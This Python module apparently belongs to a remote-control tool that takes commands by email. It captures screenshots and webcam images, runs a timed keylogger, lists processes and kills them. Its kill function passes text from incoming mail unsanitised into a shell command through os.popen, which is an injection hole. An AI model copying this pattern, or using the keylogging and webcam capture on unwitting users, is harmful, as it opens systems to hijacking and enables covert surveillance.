from constant import *


def decode_mail(msg: str):
    cmd_list = ""

    print("\r-----------------------------")
    sender = email.utils.parseaddr(msg.get("From"))[1]
    print("From:", sender)
    print("Content:")
    for part in msg.walk():
        if part.get_content_type() == "text/plain":
            content = part.get_payload(decode=True).decode("utf-8")
            print(content)
            cmd_list += content

    cmd_list = [x.split() for x in cmd_list.strip().split("\r\n")]
    return sender, cmd_list


def current_time():
    return datetime.now().strftime("%H:%M:%S %d-%b-%Y")


def check_ext(file_name):
    ext = [".png", ".jpg", ".jpeg", ".tiff", ".bmp", ".gif"]
    if not any(file_name.endswith(x) for x in ext):
        file_name += ".png"
    return file_name


def capture_SS(cmd_list):
    file_name = cmd_list[1] if len(cmd_list) > 1 else "Screenshot.png"
    file_name = check_ext(file_name)

    file_name = "Files\\Pictures\\" + file_name
    with open(file_name, "w") as f:
        pass

    screenshot = ImageGrab.grab()
    screenshot.save(file_name)
    return file_name


def capture_webcam(cmd_list):
    file_name = cmd_list[1] if len(cmd_list) > 1 else "Webcam.png"
    file_name = check_ext(file_name)

    cap = VideoCapture(0)

    message: str = "A picture taken from your webcam at " + current_time() + "."
    file_name = "Files\\Pictures\\" + file_name
    with open(file_name, "w") as f:
        pass

    if not cap.isOpened():
        message = "ERROR: Cannot open camera"
        exit()

    success, frame = cap.read()

    imwrite(file_name, frame)
    cap.release()
    if not success:
        message = "ERROR: Cannot capture frame"

    return file_name, message


def key_logger(cmd_list):
    file_path: str = "Files\\Keylog.txt"
    duration = int(cmd_list[1]) if len(cmd_list) > 1 else 5

    # ? Ensure the existence of the file
    with open(file_path, "w") as f:
        pass
    
    key = logging.getLogger()
    key.setLevel(logging.INFO)
    formater = logging.Formatter("%(asctime)s - %(message)s", "%d-%b-%Y %H:%M:%S")
    file_handler = logging.FileHandler(file_path, mode="w")
    file_handler.setFormatter(formater)
    key.addHandler(file_handler)

    def on_press(key):
        try:
            logging.info(str(key))
        except AttributeError:
            logging.error(str(key))

    with Listener(on_press=on_press) as listener:
        sleep(duration)
        listener.stop()
        
    key.removeHandler(file_handler)
    file_handler.close()
    return file_path, duration


def note2log(sender, cmd_list, attachment, body):
    file_path: str = "Files\\mail.log"
    if not attachment:
        attachment = "None"

    with open(file_path, "a") as log:
        pass
    
    key = logging.getLogger()
    key.setLevel(logging.INFO)
    formater = logging.Formatter("Time:\t\t%(asctime)s \n%(message)s", "%d %b %Y %H:%M:%S")
    file_handler = logging.FileHandler(file_path, mode="a")
    file_handler.setFormatter(formater)
    key.addHandler(file_handler)
    
    command = [" ".join(cmd_list[i]) for i in range(len(cmd_list))]
    command = "\n\t\t\t".join(command)
    
    attachment = ", ".join(attachment)
    # command = " ".join(cmd_list)
    line = f"From:\t\t{sender}\nContent:\n\t\t\t{command}\n\n"
    line += f"Reply:\t\t{body}\nAttachment:\t{attachment}\n"
    line += "----------------------------------------\n"
    
    logging.info(line)

    key.removeHandler(file_handler)
    file_handler.close()


def list_command() -> str:
    content = "The supported commands:"
    content += "\n\t- screenshot [file_name]"
    content += "\n\t- webcam [file_name]"
    content += "\n\t- keylog [time in seconds]"
    content += "\n\t- logout"
    content += "\n\t- shutdown [time in seconds]"
    content += "\n\t- listApp"
    content += "\n\t- listProcess"
    content += "\n\t- terminateProcess [PID/Process Name]"
    content += "\n\t- log"
    content += "\n\t- help"
    return content


def list_running_application():
    file_path = "Files\\Applications.txt"

    powershell_script = """
    Get-Process | Where-Object {$_.MainWindowHandle -ne 0} | Select-Object -ExpandProperty Name
    """

    try:
        # Run PowerShell script
        result = subprocess.run(
            ["powershell", "-Command", powershell_script],
            capture_output=True,
            text=True,
            check=True,
        )

        # Print the result
        with open(file_path, "w") as f:
            f.write("Running Applications:\n")
            f.write("======================\n")
            f.write(result.stdout)

    except subprocess.CalledProcessError as e:
        pass
    return file_path


def list_running_process():
    file_path: str = "Files\\Processes.txt"

    command = "tasklist"
    result = os.popen(command).read()

    def take_2(data):
        lines = data.split("\n")
        index = lines[1].find("Session Name")
        lst = [i[:index] for i in lines]
        data = "\n".join(lst)
        return data

    with open(file_path, "w") as file:
        file.write(take_2(result))

    return file_path


def kill_process(data):
    command: str = ""
    data = str(data)
    if data.isdigit():
        command = "taskkill /PID " + data + " /F"
    else:
        command = "taskkill /IM " + data + " /F"

    result = os.popen(command).read()
    return result
